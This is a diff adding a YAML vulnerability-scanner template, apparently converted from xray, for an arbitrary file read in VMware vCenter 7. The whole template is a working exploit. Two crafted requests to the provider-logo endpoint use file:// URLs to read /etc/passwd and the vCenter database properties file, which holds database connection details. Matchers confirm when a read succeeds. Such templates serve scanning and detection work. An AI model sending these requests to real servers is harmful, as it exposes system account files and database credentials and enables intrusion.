@@ -1,0 +1,39 @@
+id: poc-yaml-vmware-vcenter-7-arbitrary-file-read
+
+info:
+  name: poc-yaml-vmware-vcenter-7-arbitrary-file-read
+  author: xiaochen.zhang
+  severity: critical
+  tags: xray-converted,lfi,ct-442597
+  reference:
+    - https://github.com/l0ggg/VMware_vCenter
+
+http:
+  - raw:
+      - |
+        GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
+  - raw:
+      - |
+        GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///C:/ProgramData/VMware/vCenterServer/cfg/vmware-vpx/vcdb.properties HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "org.postgresql.Driver"
